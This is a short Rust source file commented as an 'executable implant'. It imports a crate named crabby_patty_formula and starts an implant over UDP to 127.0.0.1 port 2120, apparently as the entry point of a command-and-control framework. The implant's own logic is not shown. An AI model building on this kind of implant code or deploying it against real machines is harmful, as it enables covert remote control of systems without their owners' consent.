// executable implant
//
//

use crabby_patty_formula::*;
use std::net::SocketAddr;

fn main(){
    imp_run("udp", SocketAddr::from(([127, 0, 0, 1], 2120)));
}
